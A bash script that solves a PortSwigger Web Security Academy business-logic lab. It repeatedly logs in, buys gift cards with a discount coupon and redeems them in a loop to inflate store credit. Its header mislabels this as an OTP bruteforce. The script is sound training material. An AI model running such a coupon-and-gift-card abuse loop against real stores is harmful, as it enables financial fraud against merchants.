#!/bin/bash

# Author: kond3
# Date: 06/08/2024
# Last modified: 06/08/2024 20:53:35

# Description
# Simple script to bruteforce the OTP in Portswigger Lab 05 of Business Logic Vulnerabilities Topic

# Usage
# ./gift_card.sh <random_part_of_url>


# Initial checks

if [[ "$1" == "" ]];then
	echo -e "Usage: \t ./gift_card.sh <random_part_of_url>"
	exit 1
fi

if [ -d output ];then
	rm -rf output
fi

mkdir output

if [ -d header ];then
	rm -rf header
fi

mkdir header

# function definition

function nl {
	for (( i = 0; i < $1 ; i++ ));do
		echo ""
	done
}

session="session=$(pwgen 33 -1)"

function get_login {
	curl -s -D header/header.txt -o output/output.txt "$site_url"/login 1>/dev/null

	session=$(cat header/header.txt | head -n 3 | tail -n 1 | awk '{print $2}' | sed 's/;//')
	token=$(cat output/output.txt | grep "csrf" | awk '{print $5}' | sed 's/value=//' | sed 's/["][>]*//g')
}

function post_login {
	curl -s -D header/header.txt -X POST -d "csrf=$token&username=wiener&password=peter" -b "$session" "$site_url"/login 1>/dev/null

	session=$(cat header/header.txt | head -n 3 | tail -n 1 | awk '{print $2}' | sed 's/;//')
}

function post_cart {
	curl -k -x http://127.0.0.1:8080 -L -s -D header/header.txt -d "productId=2&redir=PRODUCT&quantity=5" -b "$session" "$site_url"/cart 1>/dev/null
}

function get_cart {
	curl -s -D header/header.txt -o output/output.txt -b "$session" "$site_url"/cart 1>/dev/null

    token=$(cat output/output.txt | grep "csrf" | awk '{print $5}' | sed 's/value=//' | sed 's/["][>]*//g' | uniq)
}

function post_coupon {
	curl -k -x http://127.0.0.1:8080 -L -s -D header/header.txt -d "csrf=$token&coupon=SIGNUP30" -b "$session" "$site_url"/cart/coupon 1>/dev/null
}

function post_checkout {
	curl -k -x http://127.0.0.1:8080 -L -s -D header/header.txt -o output/output.txt -d "csrf=$token" -b "$session" "$site_url"/cart/checkout 1>/dev/null

	cat output/output.txt | grep "<td>.*</td>" | head -n 12 | tail -n 10 | sed 's:.*<td>::g' | sed 's:</td>::g' > output/codes.txt
	credit=$(cat output/output.txt | grep "Store credit" | sed 's:.*<p><strong>::g' | sed 's:</strong></p>::g')
}

function post_gc {
	curl -k -x http://127.0.0.1:8080 -L -s -D header/header.txt -d "csrf=$token&gift-card=$1" -b "$session" "$site_url"/gift-card 1>/dev/null
}

echo ""

site_url="https://$1.web-security-academy.net"

echo -e "Buying gift cards using coupon and redeeming them multiple times...\n"
for i in {1..400};do

	get_login
	post_login

	post_cart

	get_cart
	post_coupon

	post_checkout

	while read -r line <&7;do
		post_gc "$line"
	done 7< output/codes.txt

	printf "%s \r" "$credit"

	credit_math=$(echo "$credit" | sed 's/.*\$//' | sed 's:\.00::')

	if [ $credit_math -gt 1337 ];then
		break
	fi

done

echo -e "Sufficient credit reached!\n\nGood luck with your PortSwigger Academy journey. \n\nPlease consider starring this repo, bye! \nkond3, $(date +%d.%m.%Y) \n"
exit 0
